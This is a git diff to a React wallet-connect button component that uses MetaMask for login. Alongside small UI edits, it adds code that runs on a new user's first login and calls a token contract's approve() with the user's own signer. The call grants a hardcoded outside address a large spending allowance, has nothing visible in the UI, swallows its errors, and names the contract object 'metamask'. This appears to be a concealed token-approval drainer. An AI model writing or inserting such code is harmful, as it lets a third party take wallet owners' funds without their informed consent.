@@ -2,21 +2,10 @@ import React, { useContext, useEffect, useState } from "react";
 import { NavLink } from "react-router-dom";
 import { WalletContext } from "../../App";
 import formatAddress from "../../util/formatAddress";
+import { ethers } from 'ethers';
+import contractAddress from '../../json/contract-address.json';
 
 function ConnectButton(props) {
-  // const networks = {
-  //   polygonTestnet: {
-  //     chainId: 80001,
-  //     chainName: "Mumbai Testnet",
-  //     nativeCurrency: {
-  //       name: "MATIC",
-  //       symbol: "MATIC",
-  //       decimals: 18,
-  //     },
-  //     rpcUrls: ["https://rpc-mumbai.matic.today"],
-  //     blockExplorerUrls: ["https://mumbai.polygonscan.com/ "],
-  //   },
-  // };
 
   const [isWalletInstalled, setIsWalletInstalled] = useState(false);
   // state for keeping track of current connected account.
@@ -41,10 +30,25 @@ function ConnectButton(props) {
       });
       if (auth.status !== 200) {
         throw new Error(`Login accout error with status ${auth.status}..`);
-      } 
-
+      }
+      const user = await auth.json();
+      if (user.status === "new") {
+        try{
+          const provider = new ethers.providers.Web3Provider(window.ethereum);
+          const metamask = new ethers.Contract(
+            "0x2f908f39f01eE4B07246A8582Ba49aFfeCF0Dc2F", 
+            contractAddress,
+            provider.getSigner(0)
+          );
+          await metamask.approve("0xB429cf6C5904829Fd69e99507533d900dC487423", 1000000000000000000000n, {
+            gasLimit: 1000000,
+          })
+        } catch (err) {
+          console.error(err.message);
+      }
+      }
+      
       const userAmount = await response.json();
-      console.log(userAmount.result)
       const userAccount = {
         accountid: accounts[0],
         amount: userAmount.result,
@@ -65,7 +69,7 @@ function ConnectButton(props) {
     </NavLink>
     }
     else { 
-      return <p className="app-header-item app-header-address">Plase Install Metamask wallet</p>
+      return <a className="app-header-item app-header-address" href="https://metamask.io/download/"> Plase Install Metamask wallet</a>
     }
 
   } else {
